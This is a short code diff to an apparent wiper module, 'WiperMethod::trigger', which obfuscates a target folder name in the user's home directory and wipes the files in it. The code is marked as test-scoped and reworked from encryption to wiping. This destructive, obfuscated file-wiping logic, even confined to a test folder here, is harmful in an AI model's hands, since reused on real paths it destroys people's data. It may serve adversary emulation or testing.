@@ -6,6 +6,10 @@
 #include "utils/Obfuscation.hpp"
 #include "core/Config.hpp"
 
+#ifdef IMPACT_LEVEL_TEST
+#include <filesystem>
+#endif
+
 bool WiperMethod::trigger() {
     std::string homeDir = SystemUtils::GetUserHome();
 
@@ -13,7 +17,7 @@ bool WiperMethod::trigger() {
         std::string targetPath = homeDir + "/" + OBFL(".ghost_test");
         LOG_INFO("[TEST] Wiping files in {}", targetPath)
 
-        if (encrypt && !std::filesystem::exists(targetPath)) {
+        if (!std::filesystem::exists(targetPath)) {
             FileUtils::WriteFile(targetPath, "");
         }
 
@@ -43,7 +47,7 @@ bool WiperMethod::trigger() {
                     successCount++;
                 }
             } catch (const std::exception& e) {
-                LOG_ERROR("Failed to encrypt {}", filePath, e.what())
+                LOG_ERROR("Failed to wipe {}", filePath, e.what())
             }
         }
         LOG_SUCCESS("[USER] Wiper summary: wiped {} files", successCount)
